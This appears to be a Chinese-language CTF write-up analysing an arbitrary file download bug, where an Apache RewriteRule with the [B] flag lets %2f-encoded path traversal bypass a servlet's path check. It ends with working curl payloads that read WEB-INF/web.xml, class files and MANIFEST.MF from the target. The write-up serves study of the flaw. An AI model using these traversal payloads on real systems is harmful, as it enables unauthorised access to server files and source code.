# 任意文件下载漏洞分析

## DashboardServlet 下载功能实现

```java
private void downloadFile(HttpServletRequest req, HttpServletResponse resp) {
    // 1. 获取path参数
    String path = req.getParameter("path");
    
    // 2. 固定基础目录为 "uploads"
    File baseDir = new File(
        getServletContext().getRealPath("uploads")
    ).getCanonicalFile();
    
    // 3. 拼接完整路径
    File targetFile = new File(baseDir, path).getCanonicalFile();
    
    // 4. 路径验证 - 检查是否在baseDir内
    if (!targetFile.getPath().startsWith(baseDir.getPath())) {
        return error("invalid path");
    }
    
    // 5. 读取并返回文件
    try (InputStream in = Files.newInputStream(targetFile.toPath());
         OutputStream out = resp.getOutputStream()) {
        in.transferTo(out);
    }
}
```

## 关键问题

### 1. 基础目录固定为 "uploads"
```java
File baseDir = new File(
    getServletContext().getRealPath("uploads")  // ← 硬编码！
).getCanonicalFile();
```

**注意**：
- 下载功能的baseDir是硬编码的 `"uploads"`
- **不受 `AdminDashboardServlet.resourceDir` 影响**
- 这和上传功能不同！

### 2. 路径拼接
```java
File targetFile = new File(baseDir, path).getCanonicalFile();
```

- `baseDir` = `/path/to/webapp/uploads`
- `path` = 用户输入（URL参数）
- `targetFile` = `baseDir` + `path`

### 3. 路径验证
```java
if (!targetFile.getPath().startsWith(baseDir.getPath())) {
    return error("invalid path");
}
```

**验证逻辑**：目标文件路径必须以baseDir开头

## 绕过方法

### ❌ 方法1: 直接使用 `..` (失败)
```
/dashboard/download?path=../WEB-INF/web.xml
```

**结果**：被 `getCanonicalFile()` 规范化
- `uploads/../WEB-INF` → `/path/to/webapp/WEB-INF`
- 不以 `uploads` 开头 → 验证失败 ❌

### ✅ 方法2: Apache Rewrite规则绕过 (成功！)

**关键**：请求不走 `/dashboard/download`，而是走 `/download`！

```apache
RewriteCond %{QUERY_STRING} (^|&)path=([^&]+)
RewriteRule ^/download$ /%2 [B,L]
```

**攻击流程**：
```
1. 请求: GET /download?path=uploads%2f..%2fWEB-INF%2fweb.xml

2. Apache Rewrite匹配:
   - 捕获: path = "uploads%2f..%2fWEB-INF%2fweb.xml"
   - 重写为: /uploads%2f..%2fWEB-INF%2fweb.xml
   
3. [B]标志解码:
   - %2f → /
   - 结果: /uploads/../WEB-INF/web.xml

4. 路径规范化:
   - uploads/../ = (空)
   - 最终请求: /WEB-INF/web.xml

5. 直接返回文件! (绕过了DashboardServlet的验证)
```

## 两种下载路径的区别

### 路径1: `/dashboard/download` (有验证)
```
GET /dashboard/download?path=../WEB-INF/web.xml
    ↓
DashboardServlet.downloadFile()
    ↓
baseDir = uploads/
targetFile = uploads/../WEB-INF/web.xml → 规范化 → /WEB-INF/web.xml
    ↓
验证: /WEB-INF/web.xml.startsWith(/uploads/) → false
    ↓
返回 "invalid path" ❌
```

### 路径2: `/download` (Apache处理，无验证)
```
GET /download?path=uploads%2f..%2fWEB-INF%2fweb.xml
    ↓
Apache Rewrite: 重写为 /uploads%2f..%2fWEB-INF%2fweb.xml
    ↓
[B]标志解码: /uploads/../WEB-INF/web.xml
    ↓
路径规范化: /WEB-INF/web.xml
    ↓
Tomcat直接返回静态文件 ✅
```

## 完整利用方式

```bash
# 读取 web.xml
curl "http://target:25004/download?path=uploads%2f..%2fWEB-INF%2fweb.xml"

# 读取 class文件
curl "http://target:25004/download?path=uploads%2f..%2fWEB-INF%2fclasses%2fcom%2fctf%2fLoginServlet.class" -o LoginServlet.class

# 读取配置文件
curl "http://target:25004/download?path=uploads%2f..%2fMETA-INF%2fMANIFEST.MF"
```

## 总结

**任意文件下载的实现方式**：

1. **DashboardServlet有路径验证** → 无法直接绕过
2. **Apache Rewrite规则的 `[B]` 标志** → 允许URL编码绕过
3. **使用 `/download` 而非 `/dashboard/download`** → 绕过Servlet验证
4. **使用 `%2f` 编码 `/`** → 在Apache层面解码成路径遍历
5. **最终实现任意文件读取**

**关键点**：
- `%2f` 不是普通的URL编码 `/`
- 它是专门用来绕过安全检查的技巧
- Apache的 `[B]` 标志会在后端解码它
- 导致路径遍历攻击成功

